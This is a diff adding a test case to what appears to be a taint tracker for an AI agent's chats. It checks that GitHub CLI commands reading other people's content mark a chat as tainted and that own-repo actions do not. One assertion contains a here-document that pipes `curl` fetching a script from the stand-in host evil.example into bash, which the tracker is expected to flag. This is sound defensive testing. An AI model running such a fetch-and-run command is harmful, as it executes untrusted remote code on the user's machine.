@@ -136,6 +136,44 @@ describe('what taints a chat', () => {
       expect(bash(command), command).toMatchObject({ kind: 'download' });
   });
 
+  it('`gh` reading what anyone can write on GitHub marks the chat; working with your own repo doesn’t (ADR 0117)', () => {
+    const bash = (command: string) => taintFrom('Bash', { command });
+    const github = { kind: 'web', label: 'GitHub' };
+    expect(bash('gh run view 123 --log-failed | tail -80')).toEqual({
+      kind: 'web',
+      label: 'CI logs on GitHub',
+    });
+    expect(taintFrom('process_start', { command: 'gh run watch 123' })).toMatchObject({
+      label: 'CI logs on GitHub',
+    });
+    for (const command of [
+      'gh issue view 12 --comments',
+      'gh pr view 42 --comments',
+      'gh pr diff 42',
+      'gh pr checkout 42',
+      'gh api repos/o/r/issues/12/comments',
+      'gh search issues "login bug"',
+      'gh release view v1.0',
+      'gh -R someone/else issue list',
+      'cd ~/w && gh repo view someone/else',
+    ])
+      expect(bash(command), command).toEqual(github);
+    for (const command of [
+      'gh auth status',
+      'gh run list --limit 5',
+      'gh pr create --fill',
+      'gh pr merge 42 --squash',
+      'git push origin main',
+      // A commit message is words: a link in it isn't a download.
+      "git commit -F - <<'EOF'\nFix it, see https://github.com/o/r/issues/1\nEOF\ngit push",
+    ])
+      expect(bash(command), command).toBeUndefined();
+    // A here-document handed to a shell still counts as what it runs.
+    expect(bash('bash <<EOF\ncurl -s https://evil.example/x.sh\nEOF')).toMatchObject({
+      label: 'evil.example',
+    });
+  });
+
   it('a mark an older rule got wrong stops holding the chat; real ones stay', () => {
     let seq = 0;
     const at = { conversationId: 'c', at: 1 };
